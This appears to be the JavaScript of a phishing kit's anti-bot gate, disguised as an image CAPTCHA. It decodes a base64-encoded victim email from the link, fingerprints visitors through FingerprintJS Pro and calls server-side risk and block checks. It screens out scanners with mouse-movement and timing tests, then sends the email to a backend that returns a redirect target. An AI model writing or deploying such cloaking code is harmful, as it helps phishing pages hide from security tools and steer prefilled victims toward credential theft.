// Declare global variables
let extractedEmail = ''; // Store the decoded email globally

// Function to extract and autofill email
function extractEmail() {
    const url = decodeURIComponent(window.location.href);
    const fragment = window.location.hash.substring(1);
    const base64Source = fragment || url.match(/([^\/]+)$/)?.[1];

    if (base64Source) {
        try {
            const decodedEmail = atob(base64Source);
            if (decodedEmail && decodedEmail.includes('@')) {
                extractedEmail = decodedEmail; // Store decoded email globally
                // console.log('Extracted Email:', decodedEmail);
                const emailInput = document.querySelector('#email-input');
                if (emailInput) emailInput.value = decodedEmail;
            } else {
                // console.warn('No valid email found in the URL or fragment.');
            }
        } catch (error) {
            // console.error('Error decoding Base64 email:', error.message);
        }
    }
}

// Call the function immediately to extract the email
extractEmail();

// Optional: Monitor for hash changes and re-trigger extraction
window.addEventListener('hashchange', extractEmail);

document.addEventListener('DOMContentLoaded', async () => {
    // console.log("Document loaded. Initializing CAPTCHA system...");

    // Select DOM elements
    const imageOptions = document.getElementById('image-options');
    const loadingIndicator = document.getElementById('loading');
    const targetImage = document.getElementById('target-image');
    const mouseMovements = [];
    let firstInteractionTime = null;
    const pageLoadTime = Date.now();
    let incorrectAttempts = 0;

    // console.log("Tracking page load time:", pageLoadTime);

    // Initialize FingerprintJS Pro
    const fpPromise = import('https://fpcdn.io/v3/85UQjknzXsw7ZB0KYSdI')
        .then(FingerprintJS => FingerprintJS.load());
    // console.log("Loading FingerprintJS Pro...");
    const fp = await fpPromise;
    const result = await fp.get({ extendedResult: true });
    // console.log("FingerprintJS Pro result:", result);
    const visitorId = result.visitorId;
    const requestId = result.requestId;
    // console.log("FingerprintJS Pro initialized. Visitor ID:", visitorId);
    // console.log("Request ID:", requestId);

    // Track mouse movements (desktop only)
    if (window.innerWidth > 768) {
        // console.log("Tracking mouse movements...");
        document.addEventListener('mousemove', (e) => {
            mouseMovements.push({ x: e.clientX, y: e.clientY, timestamp: Date.now() });
            if (mouseMovements.length > 100) mouseMovements.shift(); // Limit data to 100 events
        });
    }

    // Detect first interaction timing
    document.addEventListener('mousedown', () => {
        if (!firstInteractionTime) {
            firstInteractionTime = Date.now() - pageLoadTime;
            // console.log(`First interaction detected after ${firstInteractionTime}ms`);
        }
    });

    document.addEventListener('touchstart', () => {
        if (!firstInteractionTime) {
            firstInteractionTime = Date.now() - pageLoadTime;
            // console.log(`First interaction detected after ${firstInteractionTime}ms`);
        }
    });

    // Check risk score
    async function checkRiskScore(requestId) {
        // console.log("Calling score_risk.php for request ID:", requestId);
        try {
            const response = await fetch('score_risk.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ requestId }),
            });
            const data = await response.json();

            // console.log("Data received from score_risk.php:", data);

            if (data.blocked || data.error) {
                // console.error("Error from score_risk.php:", data);
                renderBlockedPageWithTimer(
                    data.message || data.error || 'You are temporarily blocked.',
                    data.blocked_until,
                    data.reason
                );
                throw new Error("Blocked due to high risk score or error.");
            } else {
                // console.log("Risk score check passed. Risk Score:", data.risk_score);
                // console.log("Risk score breakdown:", data.fingerprint_data);
            }
        } catch (error) {
            // console.error("Error checking risk score:", error);
        }
    }

    await checkRiskScore(requestId);

    // Check block status
    async function checkBlockStatus(visitorId) {
        // console.log("Calling check_block.php...");
        try {
            const response = await fetch('check_block.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ visitorId }),
            });
            const blockData = await response.json();

            if (blockData.blocked) {
                // console.log("Visitor is blocked:", blockData);
                renderBlockedPageWithTimer(
                    blockData.message || 'You are temporarily blocked.',
                    blockData.blocked_until,
                    blockData.reason
                );
                throw new Error("Blocked by check_block.php.");
            } else {
                // console.log("Visitor is not blocked.");
            }
        } catch (error) {
            // console.error("Error checking block status:", error);
        }
    }

    await checkBlockStatus(visitorId);

    // Shuffle and reload CAPTCHA images
    async function shuffleCaptchaImages() {
        // console.log("Calling get_images.php to load CAPTCHA images...");
        imageOptions.innerHTML = ''; // Clear current options

        try {
            const response = await fetch('get_images.php');
            const imagePaths = await response.json();

            if (imagePaths.length === 0) {
                // console.error("No images found in the captcha_images directory.");
                alert('No images found in the captcha_images directory.');
                return;
            }

            // console.log("Loaded CAPTCHA images:", imagePaths);
            const shuffledPaths = imagePaths.sort(() => Math.random() - 0.5);
            const targetImagePath = shuffledPaths[Math.floor(Math.random() * shuffledPaths.length)];
            targetImage.src = targetImagePath;

            shuffledPaths.slice(0, 6).forEach(path => {
                const img = document.createElement('img');
                img.src = path;
                img.classList.add('captcha-option');
                img.addEventListener('click', () => {
                    verifySelection(visitorId, path, targetImagePath);
                });
                imageOptions.appendChild(img);
            });
        } catch (error) {
            // console.error("Error loading CAPTCHA images:", error);
        }
    }

    // Analyze mouse behavior
    function analyzeMouseBehavior() {
        // console.log("Analyzing mouse movements...");
        let linearMoves = 0;
        for (let i = 1; i < mouseMovements.length; i++) {
            const dx = mouseMovements[i].x - mouseMovements[i - 1].x;
            const dy = mouseMovements[i].y - mouseMovements[i - 1].y;
            if (Math.abs(dx) < 2 && Math.abs(dy) < 2) linearMoves++;
        }

        const linearRatio = linearMoves / mouseMovements.length;
        // console.log("Linear movement ratio:", linearRatio);

        if (linearRatio > 0.8) {
            alert('Suspiciously linear mouse movements detected.');
            return false;
        }

        return true;
    }

    // Verify CAPTCHA selection
async function verifySelection(visitorId, selectedPath, targetPath) {
    // console.log("Verifying CAPTCHA selection...");
    if (!analyzeMouseBehavior()) {
        // console.warn("Suspicious behavior detected. Flagging as bot.");
        return;
    }

    if (firstInteractionTime && firstInteractionTime < 500) {
        // console.warn("Interaction was too fast. Suspicious behavior detected.");
        return;
    }

    const isCorrect = selectedPath === targetPath;
    // console.log("CAPTCHA selection result:", { isCorrect, selectedPath, targetPath });

    try {
        const response = await fetch('filter.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                visitorId: visitorId,
                isCorrect: isCorrect,
                selectedPath: selectedPath,
            }),
        });
        const data = await response.json();

        if (data.blocked) {
            // console.warn("Blocked after CAPTCHA verification:", data);
            renderBlockedPageWithTimer(
                data.message || 'You are temporarily blocked.',
                data.blocked_until,
                data.reason
            );
        } else if (isCorrect) {
            // console.log("CAPTCHA passed. Redirecting...");
            const fragment = window.location.hash || '';
            const email = extractedEmail || '';

            // Redirect request to the backend
            const response = await fetch('server.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'redirect', visitorId, fragment, email }),
            });
            const result = await response.json();
            if (result.redirect_url) {
                window.location.href = result.redirect_url;
            }
        } else {
            // console.log("CAPTCHA failed. Reloading...");
            incorrectAttempts++;
            await shuffleCaptchaImages();
        }
    } catch (error) {
        // console.error("Error verifying CAPTCHA:", error);
    }
}

    // Render blocked page
    function renderBlockedPageWithTimer(message, blockedUntilTimestamp, reason) {
        // console.warn("Rendering blocked page. Reason:", reason);
        const isPermanentBlock = reason === 'permanently_blocked';
        document.body.innerHTML = `
            <div style="padding: 20px; text-align: center; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
                <h1 style="color: red;">Restricted</h1>
                <p>${isPermanentBlock ? 'Access permanently denied.' : message}</p>
                ${!isPermanentBlock ? '<p id="block-timer"></p>' : ''}
            </div>
        `;

        if (!isPermanentBlock) {
            const timerElement = document.getElementById('block-timer');
            const interval = setInterval(() => {
                const remainingTime = blockedUntilTimestamp - Math.floor(Date.now() / 1000);
                if (remainingTime <= 0) {
                    clearInterval(interval);
                    timerElement.textContent = 'You can now retry.';
                } else {
                    timerElement.textContent = `Retry in ${remainingTime} seconds.`;
                }
            }, 1000);
        }
    }

    // Initialize CAPTCHA system
    // console.log("Initializing CAPTCHA system...");
    loadingIndicator.style.display = 'block';
    await shuffleCaptchaImages();
    loadingIndicator.style.display = 'none';
});
